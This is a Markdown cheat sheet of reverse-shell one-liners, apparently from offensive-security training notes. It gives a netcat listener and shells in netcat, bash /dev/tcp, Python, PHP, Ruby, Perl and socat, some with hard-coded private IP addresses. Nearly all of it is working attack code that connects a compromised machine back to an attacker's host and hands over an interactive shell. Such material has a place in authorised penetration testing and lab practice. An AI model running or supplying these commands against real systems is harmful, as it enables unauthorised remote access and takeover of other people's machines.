## Generate Reverse shell 
https://offsecnewbie.com/reverse_shell.php

### Netcat Listener
```bash
nc -nlvp 1000
```
### Netcat (Traditional)

```bash
nc -e /bin/sh $HOST $PORT
```

### Netcat (OpenBSD)

OpenBSD netcat removed the `-e` flag “for security.” All of these mechanisms will also work on traditional netcat.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.123 8080 >/tmp/f
```

--------

## Bash

Bash **only** reverse shells generally require that `/dev/tcp` is enabled in bash at build-time.

```bash
bash -i >& /dev/tcp/$HOST/$PORT 0>&1
```

Use redirection through a temporary FD (in this case, 42).

```bash
0<&42;exec 42<>/dev/tcp/$HOST/$PORT; sh <&42 >&42 2>&42
```

## Python

```bash
python -c 'import socket as so,subprocess,os;s=so.socket(so.AF_INET,so.SOCK_STREAM);s.connect(("$HOST",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP

```bash
php -r '$sock=fsockopen("$HOST",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock = fsockopen("192.168.119.221",4444);$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("$HOST",$PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Perl

```bash
perl -e 'use Socket;$i="$HOST";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

-------------
### Socat

[Socat is also a great handler for the shells](https://systemoverlord.com/2018/01/20/socat-as-a-handler-for-multiple-reverse-shells.html)

```bash
socat TCP:$HOST:$PORT exec:/bin/bash,pty,stderr,setsid
```

You can even get a full pty if you use socat as your listener.

Listener:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:$PORT
```

Victim:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$HOST:$PORT
```

